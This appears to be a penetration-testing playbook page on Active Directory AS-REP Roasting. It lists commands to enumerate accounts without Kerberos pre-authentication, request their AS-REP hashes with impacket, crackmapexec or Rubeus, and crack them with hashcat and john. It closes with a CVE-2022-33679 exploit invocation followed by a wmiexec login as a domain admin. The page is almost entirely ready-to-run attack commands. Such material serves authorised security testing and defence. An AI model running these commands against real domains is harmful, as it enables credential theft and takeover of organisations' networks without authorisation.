## AS-REP Roasting Attack [t-ad-kerberos-as_rep_roasting]

If "Do not require pre-authentication" flag is set to the account it makes it vulnerable for 
AS-REP Roasting attack.

In this attack, an attacker can send an authentication request (AS-REQ) to the KDC 
on behalf of the user without providing an authenticator (encrypted timestampt). 
The KDC will respond with an AS-REP message that includes a part, which is encrypted using the 
user`s kerberos key (derived from user`s password or hash).

The attacker can attempt to crack the encrypted part offline by guessing the user`s password.



{% hint style="info" %}It worth checking if the DCs are vulnerable to RC4 AS-REP Decryption  (CVE-2022-33647, CVE-2022-33679) vulnerability. 

{% endhint %}
### 3.1.1 Enumerate users with "Do not require pre-authentication" flag




**option 1: powershell_ad_module**

{% code overflow="wrap" %}
```bash
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
```
{% endcode %}


**option 2: powershell**

{% code overflow="wrap" %}
```bash
$root = [ADSI]"LDAP://dc=domain,dc=com"
$search = new-Object System.DirectoryServices.DirectorySearcher($root)
$search.Filter ="(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$search.FindAll()

```
{% endcode %}


**option 3: powerview**

{% code overflow="wrap" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose

```
{% endcode %}


**option 4: ldapsearch**

{% code overflow="wrap" %}
```bash
ldapsearch -x ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "DC=<domain,DC=com>" -b "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userPrincipalName memberOf
```
{% endcode %}

### 3.1.2 Request tickets




**option 1: impacket**

{% code overflow="wrap" %}
```bash
#unauthenticated
impacket-GetNPUsers domain.com/ -no-pass -usersfile ad_users.txt -outputfile hashes.asreproast

#authenticated
impacket-GetNPUsers domain.com/user:'P@ssw0rd' -request -format hashcat -outputfile hashes.asreproast

```
{% endcode %}

{% hint style="info" %}it might be useful to ask just for specific users using "-usersfile usernames.txt" parameter instead of providing creds:
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile hashes.asreproast domain.com/


{% endhint %}


**option 2: crackmapexec**

{% code overflow="wrap" %}
```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
```
{% endcode %}


**option 3: rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
```
{% endcode %}

## Crack user hashes locally [t-ad-credential_access-user_hashes_cracking]

Crack user hashes locally


{% hint style="info" %}Hashcat hash types (https://hashcat.net/wiki/doku.php?id=example_hashes):

#AR-REQ Roasting
7500 - Kerberos 5, etype 23 (RC4), Pre-Auth (3599.6 MH/s RTX4090)
19800 - Kerberos, etype 17 (AES128), Pre-Auth (5135.3 kH/s RTX4090)
19900 - Kerberos, etype 18 (AES256), Pre-Auth (2571.6 kH/s RTX4090)

#Kerberoasting 
13100 - Kerberos 5, etype 23, TGS-REP #3478.0 MH/s on RTX4090
19600 - Kerberos 5, etype 17, TGS-REP (AES128-CTS-HMAC-SHA1-96) #5100.2 kH/s on RTX4090
19700 - Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) #2562.9 kH/s on RTX4090

#AS-REP roasting
18200	Kerberos 5, etype 23 (RC4), AS-REP, 3564.1 MH/s on RTX4090

#Wordlists

#Rules
{% endhint %}
### 3.1.1 Crack the hashes using basic dictionaries




**option 1: hashcat**

{% code overflow="wrap" %}
```bash
hashcat -O -m <hashtype> hash.txt /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}


**option 2: john**

{% code overflow="wrap" %}
```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

### 3.1.2 Try to use rules



{% code overflow="wrap" %}
```bash
hashcat -O -m <hashtype> -r rules/dive.rule hash.txt /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}

### 3.1.3 Try to use pattern-based password list generators



{% code overflow="wrap" %}
```bash
psudohash.py -w 'company' --common-paddings-after --common-paddings-before -y 2020,2023
```
{% endcode %}

### 3.1.4 Try to use different wordlists



## AS-REP RC4 Decryption - CVE-2022-33679 [t-ad-kerberos-as_rep_rc4_decryption_cve_2022_33679]

Exploiation of AS-REP RC4 Decryption - CVE-2022-33679

###  None



{% code overflow="wrap" %}
```bash
python3 CVE-2022-33679.py -dc-ip <DC_IP> <domain/user> DC01.domain.com
KRB5CCNAME=da_DC01.domain.local.ccache impacket-wmiexec -k -no-pas <domain>/da@DC01.domain.local

```
{% endcode %}

{% hint style="info" %}The update disabled the RC4-MD4 (-128) encryption type alongside with RC4-HMAC-OLD (-133) 
encryption type. Once patched, future AS-REQ/TGS-REQ using one of these two encryption 
types will receive "Unsupported encryption type" error.


{% endhint %}

# Possible Findings:
* [Kerberos Pre Authentication Not Enabled](../../../findings/f-ad-account_review-disabled_pre_authentication.md)
